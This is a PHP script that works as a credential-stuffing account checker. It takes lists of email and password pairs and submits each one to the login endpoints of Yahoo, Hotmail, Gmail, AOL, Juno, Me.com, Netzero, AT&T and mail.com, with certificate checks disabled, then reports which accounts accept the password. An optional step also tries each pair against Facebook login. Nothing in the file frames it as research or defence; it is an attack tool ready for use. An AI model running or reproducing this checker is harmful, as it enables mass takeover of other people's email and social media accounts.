<?php

set_time_limit(3600);
function rmdirr($dirname)
{
if (!file_exists($dirname))
{
        echo "Not found folder";
        return false;
}

if (is_file($dirname)) {
        return unlink($dirname);
}

$dir = dir($dirname);
while (false !== $entry = $dir->read()) {

                if ($entry == '.' || $entry == '..') {
                continue;
}

        rmdirr("$dirname/$entry");
}

$dir->close();
return rmdir($dirname);
}
function yahoo($mail,$pass)
{
	$random_text = array("fr",
                    "co.uk",
                    "vn",
                    "ag",                    "br",
                    "ag",                    "ca",
                    "al",
                    "co",
                    "cl",
                    "mx",
                    "pe",
                    "ve",
                    "qc",
                    "dk",
                    "de",
                    "ie",
                    "it",
                    "ar");
srand(time());
$sizeof = count($random_text);
$random = (rand()%$sizeof);
	$url="http://login.yahoo.com/config/login?.intl=".$random_text[$random]."&.src=ym&login=".$mail."&passwd=".$pass;
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_TIMEOUT, 4);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
	$xxx=curl_exec($ch);
	curl_close($ch);
	if(stristr($xxx,"free2rhyme@yahoo.com")){
		return 0;
	}else{
		return 1;
	}
}
function netzero($mail,$pass){
$url = "https://my.netzero.net/start/login.do";
$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$postvars =
"operation=login&gotoURL=http%3A%2F%2Fmy.netzero.net%2Fstart%2Fwebmail.do%3Fcf%3Dwww&memberId=".$mail."&netzero.net=netzero.com&password=".$pass."&x=56&y=10";
$cookie = "cookies/netzero";
@unlink($cookie);
$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 4);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec ($ch);
curl_close ($ch);
unset($ch);
if(stristr($content,"The Member ID or Password you have entered is incorrect")){
		return 0;
	}else{
		return 1;
	}
}
function fb_login($login_email, $login_pass){
 touch(str_replace('\\','/',dirname(__FILE__)).'/fb_cookies.txt');
 unlink(str_replace('\\','/',dirname(__FILE__)).'/fb_cookies.txt');
 $ch = curl_init();
curl_setopt($ch, CURLOPT_TIMEOUT, 4);
 curl_setopt($ch, CURLOPT_URL, 'https://login.facebook.com/login.php?login_attempt=1');
 curl_setopt($ch, CURLOPT_POSTFIELDS,'charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&locale=en_US&email='.urlencode($login_email).'&pass='.urlencode($login_pass).'&pass_placeholder=&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84');
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
// // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_COOKIEJAR, str_replace('\\','/',dirname(__FILE__)).'/fb_cookies.txt');
 curl_setopt($ch, CURLOPT_COOKIEFILE, str_replace('\\','/',dirname(__FILE__)).'/fb_cookies.txt');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 (.NET CLR 3.5.30729)");
 curl_exec($ch);
 $err = 0;
 $err = curl_errno($ch);

$xxx=curl_exec($ch);
	curl_close($ch);
	if(stristr($xxx,"Facebook Login")){
		return 0;
	}else{
		return 1;
	}
  unlink(str_replace('\\','/',dirname(__FILE__)).'/fb_cookies.txt');

}
function setRequest($url,$headers)
{
	if (function_exists('curl_init'))
	{
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_TIMEOUT, 4);
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_FAILONERROR, TRUE);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
		curl_setopt($curl, CURLOPT_VERBOSE, FALSE);
		curl_setopt($curl, CURLOPT_HEADER,TRUE);
		curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
		$data = curl_exec($curl);
		curl_close($curl);
		return $data;
	}
	else die('Error: <a href="http://curl.haxx.se/">CURL Library</a> Not found!');
}
function hotmail($username, $password)
{
	$arr[] = "GET /rdr/pprdr.asp HTTP/1.0\\r\\n\\r\\n";
	$data = setRequest("https://nexus.passport.com:443/rdr/pprdr.asp",$arr);
 
	if ($data)
	{
		preg_match("/DALogin=(.+?),/",$data,$matches);
		$split = explode("/",$matches[1]);
 		$headers = array("GET /$split[1] HTTP/1.1\\r\\n", 
							"Authorization: Passport1.4 OrgVerb=GET,OrgURL=http://messenger.msn.com,sign-in=$username,pwd=$password");
 		$data = setRequest("https://" . $split[0] . ":443/". $split[1], $headers);
 		return ($data) ? TRUE : FALSE;
	}
	else
	{
		return FALSE;
	}	
}

function gmail($mail,$pass){
require_once('analytics_api.php');
$api = new analytics_api();
if($api->login($mail, $pass)) {
	return 1;
}else{
	return 0;
}
	
}
function att($mail,$pass){
$url = "https://webauth.att.net/auth/webmail/login";
	$xax=explode("@",$mail);
		$domain1=trim($xax[0]);
		$domain2=trim($xax[1]);
$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$postvars =
"passurl=http%3A%2F%2Fwebmail.att.net%2Fwmc%2Fen-US%2Fv%2Fwmgoto%2F4B308384000C20E4000040702223064702&locale=en-US&user=".$mail."&user1=".$domain1."&domain=".$domain2."&passwd=".$pass."&login.x=19&login.y=9&login=Login";
$cookie = "cookies/test";
@unlink($cookie);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_TIMEOUT, 4);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec ($ch);
curl_close ($ch);
unset($ch);
if(stristr($content,"Please check and re-enter your e-mail username, domain, and password")){
		return 0;
	}else{
		return 1;
	}
}
function aol($mail,$pass){
$url = "https://my.screenname.aol.com/_cqr/login/login.psp";
$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$postvars =
"screenname=".$mail."&password=".$pass."&submitSwitch=1&siteId=aolcomprod&mcState=initialized&authLev=1";
$cookie = "cookies/test";
@unlink($cookie);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_TIMEOUT, 4);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec ($ch);
curl_close ($ch);
unset($ch);
if(stristr($content,"Invalid Username or Password.")){
		return 0;
	}else{
		return 1;
	}
}
function juno($mail,$pass){
$url = "https://webmail.juno.com/cgi-bin/login.cgi?rememberMe=0";
$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$postvars =
"LOGIN=".$mail."&PASSWORD=".$pass."&ajaxSupported=2%2F61220&domain=juno.com";
$cookie = "cookies/juno";
@unlink($cookie);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_TIMEOUT, 4);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec ($ch);
curl_close ($ch);
unset($ch);
if(stristr($content,"match our files. Please re-enter your Juno username and password")){
		return 0;
	}else{
		return 1;
	}
}
function mmail($mail,$pass){
$url = "https://www.mail.com/auth/login.aspx";
$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$postvars ="login=".$mail."&password=".$pass;
$cookie = "cookies/att";
@unlink($cookie);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_TIMEOUT, 4);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec ($ch);
curl_close ($ch);
unset($ch);
if(stristr($content,"Invalid username")){
		return 0;
	}else{
		return 1;
	}
}

function mac($mail,$pass){
$url = "https://auth.me.com/authenticate";
$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$postvars =
"returnURL=aHR0cDovL3d3dy5tZS5jb20vbWFpbC8%3D&service=mail&ssoNamespace=primary-me&anchor=account&cancelURL=http%3A%2F%2Fwww.me.com%2Fmail&formID=loginForm&username=".$mail."&password=".$pass;
$cookie = "cookies/juno";
@unlink($cookie);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_TIMEOUT, 4);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec ($ch);
curl_close ($ch);
unset($ch);
if(stristr($content,"Incorrect member name or password.")){
		return 0;
	}else{
		return 1;
	}
}
function getmail($line,$xSplit,$xMail,$xPass,$checkfb)
{
	$R_split=$xSplit;
	$mail_text=$xMail;
	$pass_text=$xPass;
	$list = explode($R_split,$line);
	$pieces['xMail'] = trim($list[$mail_text]);
	$pieces['xPass'] = trim($list[$pass_text]);
 
  
if(stristr($pieces['xMail'],"yahoo.")||stristr($pieces['xMail'],"ymail.")||stristr($pieces['xMail'],"rocketmail.")){
		$servername = "<b><font color=green>Yahoo</font></b>";
		$k = yahoo($pieces['xMail'],$pieces['xPass']);
		if ($k==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}
		
}elseif(stristr($pieces['xMail'],"hotmail.")||stristr($pieces['xMail'],"live.")){
		$servername = "<b><font color=green>Hotmail</font></b>";
		if (hotmail($pieces['xMail'],$pieces['xPass']))
	{
$status="<b><font color=red>OK!</font></b>";
	}
	else
	{
$status="<i><font color=grey>Invalid id</font></i>";
	}

}elseif(stristr($pieces['xMail'],"gmail.")||stristr($pieces['xMail'],"googlemail.")){
		$servername = "<b><font color=green>Gmail</font></b>";
		$k = 		gmail($pieces['xMail'],$pieces['xPass']);
		if ($k==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}

}elseif(stristr($pieces['xMail'],"aol.")||stristr($pieces['xMail'],"netscape.")){
		$servername = "<b><font color=green>AOL</font></b>";
		$aolname = str_replace("@aol.com","",$pieces['xMail']);
	$kaol = aol($aolname,$pieces['xPass']);
if ($kaol==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}
		}elseif(stristr($pieces['xMail'],"juno")){
		$servername = "<b><font color=green>Juno</font></b>";
	$kjuno = juno($pieces['xMail'],$pieces['xPass']);
if ($kjuno==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}
		}elseif(stristr($pieces['xMail'],"mac.")||stristr($pieces['xMail'],"me.")){
		$servername = "<b><font color=green>Me-Mac</font></b>";
	$kmac = mac($pieces['xMail'],$pieces['xPass']);
if ($kmac==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}
		}elseif(stristr($pieces['xMail'],"netzero.")){
		$servername = "<b><font color=green>Netzero</font></b>";
	$knet = netzero($pieces['xMail'],$pieces['xPass']);
if ($knet==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}
		}elseif(stristr($pieces['xMail'],"ameritech.")||stristr($pieces['xMail'],"att.")||stristr($pieces['xMail'],"bellsouth.")||stristr($pieces['xMail'],"flash.")||stristr($pieces['xMail'],"nvbell.")||stristr($pieces['xMail'],"pacbell.")||stristr($pieces['xMail'],"prodigy.")||stristr($pieces['xMail'],"sbcglobal.")||stristr($pieces['xMail'],"snet.")||stristr($pieces['xMail'],"swbell.")||stristr($pieces['xMail'],"wans.")){
		$servername = "<b><font color=green>Att</font></b>";
	$katt = att($pieces['xMail'],$pieces['xPass']);
if ($katt==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		}
		}
else{
	$servername = "<b><font color=grey>Unknow</font></b>";
	  $arr = array( 
"mail.com","email.com","usa.com","consultant.com","myself.com","europe.com","london.com","post.com","engineer.com","iname.com","cheerful.com","writeme.com","lawyer.com","dr.com","asia.com","techie.com","accountant.com","adexec.com","allergist.com","alumnidirector.com","archaeologist.com","bartender.net","brew-master.com","chef.net","chemist.com","clerk.com","columnist.com","consultant.com","contractor.net","counsellor.com","deliveryman.com","diplomats.com","doctor.com","execs.com","financier.com","fireman.net","footballer.com","gardener.com","geologist.com","graphic-designer.com","hairdresser.net","instructor.net","insurer.com","journalist.com","legislator.com","lobbyist.com","mad.scientist.com","minister.com","monarchy.com","optician.com","orthodontist.net","pediatrician.com","photographer.net","politician.com","presidency.com","programmer.net","publicist.com","radiologist.net","realtyagent.com","registerednurses.com","repairman.com","representative.com","rescueteam.com","salesperson.net","scientist.com","secretary.net","socialworker.net","sociologist.com","songwriter.net","teachers.org","teacher.com","technologist.com","therapist.net","tvstar.com","umpire.com","worker.com","artlover.com","bikerider.com","birdlover.com","catlover.com","collector.org","comic.com","cutey.com","doglover.com","elvisfan.com","gardener.com","hockeymail.com","madonnafan.com","musician.org","petlover.com","reggaefan.com","rocketship.com","rockfan.com","thegame.com",",Locations","africamail.com","americamail.com","arcticmail.com","asia-mail.com","australiamail.com","berlin.com","brazilmail.com","chinamail.com","dallasmail.com","delhimail.com","dublin.com","dutchmail.com","englandmail.com","europe.com","europemail.com","germanymail.com","indiamail.com","irelandmail.com","israelmail.com","italymail.com","japan.com","koreamail.com","madrid.com","moscowmail.com","mexicomail.com","munich.com","nycmail.com","pacific-ocean.com","pacificwest.com","polandmail.com","rome.com","russiamail.com","safrica.com","samerica.com","scotlandmail.com","singapore.com","spainmail.com","swedenmail.com","swissmail.com","usa.com","alabama.usa.com","alaska.usa.com","arizona.usa.com","arkansas.usa.com","california.usa.com","colorado.usa.com","connecticut.usa.com","delaware.usa.com","florida.usa.com","georgia.usa.com","hawaii.usa.com","idaho.usa.com","illinois.usa.com","indiana.usa.com","iowa.usa.com","kansas.usa.com","kentucky.usa.com","louisiana.usa.com","maine.usa.com","maryland.usa.com","massachusetts.usa.com","michigan.usa.com","minnesota.usa.com","mississippi.usa.com","missouri.usa.com","montana.usa.com","nebraska.usa.com","nevada.usa.com","newhampshire.usa.com","newjersey.usa.com","newmexico.usa.com","newyork.usa.com","northcarolina.usa.com","northdakota.usa.com","ohio.usa.com","oklahoma.usa.com","oregon.usa.com","pennsylvania.usa.com","rhodeisland.usa.com","southcarolina.usa.com","southdakota.usa.com","tennessee.usa.com","texas.usa.com","utah.usa.com","vermont.usa.com","virginia.usa.com","washington.usa.com","westvirginia.usa.com","wisconsin.usa.com","wyoming.usa.com","2die4.com","angelic.com","activist.com","alumni.com","amorous.com","aroma.com","atheist.com","been-there.com","bigger.com","caress.com","cliffhanger.com","comic.com","comfortable.com","count.com","couple.com","cyberdude.com","cybergal.com","cyber-wizard.com","dbzmail.com","disciples.com","disposable.com","doramail.com","doubt.com","earthling.net","fastermail.com","feelings.com","graduate.org","hackermail.com","hilarious.com","homosexual.net","hot-shot.com","hour.com","howling.com","humanoid.net","indiya.com","innocent.com","inorbit.com","instruction.com","keromail.com","kittymail.com","linuxmail.org","loveable.com","mailpuppy.com","mcmug.org","mindless.com","minister.com","muslim.com","mobsters.com","monarchy.com","nastything.com","nightly.com","nonpartian.com","null.net","oath.com","orthodox.com","outgun.com","priest.com","protestant.com","playful.com","poetic.com","reborn.com","reincarnate.com","religious.com","revenue.com","rocketship.com","royal.net","saintly.com","sailormoon.com","seductive.com","sister.com","sizzling.com","skim.com","snakebite.com","soon.com","surgical.net","tempting.com","toke.com","toothfairy.com","tough.com","tvstar.com","uymail.com","wallet.com","webname.com","weirdness.com","who.net","whoever.com","winning.com","witty.com","yours.com" );
$gdoma=explode("@",$pieces['xMail']);
for ($i = 0; $i <= 272; $i++) {
   if ($arr[$i] == $gdoma[1] ){
		$servername = "<b><font color=red>".$arr[$i]."</font></b>";
$kmmail = mmail($gdoma[0],$pieces['xPass']);
  if ($kmmail==0){
			$status="<i><font color=grey>Invalid id</font></i>";
		}else{
			$status="<b><font color=red>OK!</font></b>";
		} 	
   	
   	}else{
//$servername = "Unknow";
   		$status="<font color=grey>Unknow</font>";
   	}
   	   			  

}
}
	echo "<i>Checked</i> Email:<b>".$pieces['xMail']."</b>-Password:<b>".$pieces['xPass']."</b> - <b><font color=blue>Server:</font></b>".$servername."|<b><font color=blue>Status:</font></b>".$status." - <b><font color=violet>Facebook</font>:</b> "; 
if ($checkfb == "yes" ){
$fbbb = fb_login($pieces['xMail'],$pieces['xPass']);
		if($fbbb==0){
echo "<i><font color=grey>Wrong!</font></i><br>";
		}
		elseif($fbbb==1){
		echo "<b><font color=red>OK</font></b><br>";
		}
}else{
	echo "No check<br>";
}
}
if(!$_POST['xline']||!$_POST['xMail']||!$_POST['xPass']||!$_POST['xSplit']||!$_POST['checkfb']){
	die("Pls enter full value<br>");
}
else{
	$line = $_POST['xline'];
	$xMail = $_POST['xMail']-1;
	$xPass = $_POST['xPass']-1;
	$xSplit = $_POST['xSplit'];
	$fbcheck = $_POST['checkfb'];
	getmail($line,$xSplit,$xMail,$xPass,$fbcheck);
	
}
?>